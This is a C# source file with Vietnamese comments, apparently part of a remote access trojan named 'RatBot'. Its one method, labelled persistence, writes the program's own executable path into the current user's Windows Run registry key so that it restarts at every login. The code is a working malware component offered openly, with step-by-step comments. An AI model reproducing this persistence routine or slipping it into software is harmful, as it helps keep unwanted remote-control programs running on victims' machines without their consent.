//-- for further improvement: put all webclient in try-catch

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Server
{
    internal class AddBot
    {
       
        //--Persistence
        public static void runAtStartup()
        {
            Microsoft.Win32.RegistryKey regKey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            // Mở hoặc tạo một RegistryKey với quyền ghi (true) trong cơ sở dữ liệu Registry của người dùng hiện tại (CurrentUser).
            // Ứng dụng Windows thường sử dụng Registry để lưu trữ các cài đặt và thông tin quan trọng.
            regKey.SetValue("RatBot", Process.GetCurrentProcess().MainModule.FileName);
            // Đặt một giá trị với tên là "RatBot"(tên của ứng dụng bạn muốn chạy khi khởi động)
            // và giá trị là đường dẫn của tệp thực thi của chính ứng dụng hiện tại.
            // Điều này có nghĩa là ứng dụng "RatBot" sẽ được thực thi khi hệ thống khởi động.
            regKey.Dispose();
            // Giải phóng tài nguyên được sử dụng bởi đối tượng regKey
            regKey.Close();
        }
    }
}
